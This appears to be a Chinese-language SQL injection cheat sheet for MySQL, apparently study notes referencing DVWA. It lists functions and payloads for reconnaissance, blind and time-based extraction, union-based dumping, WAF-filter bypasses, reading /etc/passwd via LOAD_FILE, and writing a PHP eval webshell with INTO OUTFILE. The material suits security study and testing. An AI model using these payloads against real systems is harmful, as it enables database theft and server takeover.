### 🟢 第一类：系统信息收集 (Reconnaissance)

**目的：** 知己知彼。在注入初期，用于判断数据库版本、当前权限和操作系统环境。

|**函数名**|**示例用法**|**功能说明**|**⚔️ 注入实战场景**|
|---|---|---|---|
|**VERSION()**|`SELECT VERSION();`|返回数据库版本号|决定能否使用某些特性（如报错注入需 v5.1+）。|
|**DATABASE()**|`SELECT DATABASE();`|返回当前连接的数据库名|确定当前的攻击目标库（如 `dvwa`）。|
|**USER()**|`SELECT USER();`|返回当前连接的用户名|判断是否为 `root` 高权限，决定能否读写文件。|
|**@@datadir**|`SELECT @@datadir;`|返回数据库文件的存储路径|猜测 Web 绝对路径，为写入 Webshell 做准备。|
|**@@version_compile_os**|`SELECT @@version_compile_os;`|返回操作系统信息|判断是 Windows (大小写不敏感) 还是 Linux。|
|**@@secure_file_priv**|`SELECT @@secure_file_priv;`|查看文件读写权限配置|**关键！** 如果为 `NULL`，则无法使用 `LOAD_FILE` 或写入文件。|

---

### 🔵 第二类：字符串截取与处理 (String Manipulation)

**目的：** 精确打击。在 **“盲注” (Blind SQLi)** 中，用于通过 `True/False` 逐个字符猜解数据。

|**函数名**|**示例用法**|**功能说明**|**⚔️ 注入实战场景**|
|---|---|---|---|
|**LENGTH()**|`LENGTH(database())>3`|返回字符串的字节长度|**盲注第一步**：先猜数据有多长，再猜具体内容。|
|**SUBSTR()**<br><br>  <br><br>_(或 SUBSTRING)_|`SUBSTR(user(), 1, 1)`|从第 n 个位置截取 m 个字符|**盲注核心**：`SUBSTR(pwd,1,1)='a'`，逐字猜解。|
|**MID()**|`MID(user(), 1, 1)`|同 `SUBSTR`|当 `SUBSTR` 被防火墙(WAF) 过滤时的**替代品**。|
|**LEFT()** / **RIGHT()**|`LEFT(user(), 1)`|从左/右截取 n 个字符|`SUBSTR` 的另一种替代方案。|
|**ASCII()**|`ASCII('a')` → 97|返回字符的 ASCII 码数值|用于**二分法盲注**：`ASCII(...) > 100`，比直接猜字符快。|
|**ORD()**|`ORD('a')`|同 `ASCII`|WAF 过滤 `ASCII()` 时的替代品。|
|**CHAR()**|`CHAR(97)` → 'a'|将 ASCII 码转回字符|绕过引号过滤：`SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)` (admin)。|

---

### 🔴 第三类：数据聚合与连接 (Aggregation)

**目的：** 批量打包。在 **“显错注入” (Union-based)** 中，用于一次性带出大量数据，避免使用 `LIMIT` 逐行翻页。

|**函数名**|**示例用法**|**功能说明**|**⚔️ 注入实战场景**|
|---|---|---|---|
|**CONCAT()**|`CONCAT(user, '-', pass)`|将多个字符串拼成一个|将用户名和密码拼在一起显示在同一个回显位。|
|**CONCAT_WS()**|`CONCAT_WS('~', A, B)`|带分隔符的拼接|结果如 `A~B`，分隔符让数据更易读。|
|**GROUP_CONCAT()**|`GROUP_CONCAT(table_name)`|**多行变一行**|**神器！** 可以在一行内显示所有表名，不用写 limit 循环。|

> **⚠️ 注意：** `GROUP_CONCAT` 默认有长度限制（通常 1024 字节），如果数据太多会被截断。

---

### 🟡 第四类：逻辑控制与延时 (Logic & Time)

**目的：** 另辟蹊径。在没有回显的情况下，通过页面响应时间或报错来判断数据。

|**函数名**|**示例用法**|**功能说明**|**⚔️ 注入实战场景**|
|---|---|---|---|
|**IF()**|`IF(1=1, A, B)`|逻辑判断：真则A，假则B|布尔盲注的基础逻辑。|
|**SLEEP()**|`SLEEP(5)`|让数据库暂停 n 秒|**时间盲注**：`IF(条件真, SLEEP(5), 0)`，如果网页卡了5秒，说明猜对了。|
|**BENCHMARK()**|`BENCHMARK(10000000, md5(1))`|执行 n 次表达式|消耗 CPU 造成延时，`SLEEP()` 被禁用时的替代方案。|

---

### 🟣 第五类：编码与文件操作 (Advanced)

**目的：** 绕过防御与提权。

|**函数名**|**示例用法**|**功能说明**|**⚔️ 注入实战场景**|
|---|---|---|---|
|**HEX()**|`HEX('admin')`|字符串转十六进制|这里的输出通常不会被 WAF 拦截，用于混淆数据。|
|**UNHEX()**|`UNHEX('61646D696E')`|十六进制转字符串|配合 `0x...` 格式使用，避免使用单引号。|
|**LOAD_FILE()**|`LOAD_FILE('/etc/passwd')`|读取服务器本地文件|获取服务器配置、源代码等敏感文件。|
|**INTO OUTFILE**|`SELECT ... INTO OUTFILE 'path'`|将查询结果写入文件|**Getshell 终极招数**：写入一句话木马 (`<?php eval($_POST[1]); ?>`)。|

---

### 💡 专家级 Tips：组合拳示例

单纯知道函数是不够的，SQL 注入的精髓在于**组合**。

1. **一次性爆出所有表名 (Group_Concat + Information_Schema):**
	
    ```sql
    UNION SELECT 1, GROUP_CONCAT(table_name), 3
    FROM information_schema.tables
    WHERE table_schema=database()
    ```
    
    _(解释：利用 `GROUP_CONCAT` 把几十个表名打包成一个长字符串，放在第 2 个回显位显示。)_
    
2. **绕过单引号过滤 (Hex Encoding):**
    
    假设 WAF 过滤了 `'admin'`，你可以用十六进制 `0x61646D696E` 代替：
	
    ```sql
    SELECT * FROM users WHERE username = 0x61646D696E
    ```
    
3. **时间盲注判断 (Sleep + If):**
	
    ```sql
    AND IF(SUBSTR(database(),1,1)='d', SLEEP(5), 0)
    ```
    
    _(解释：如果数据库名第一个字母是 'd'，就睡 5 秒；否则立即返回。)_
    
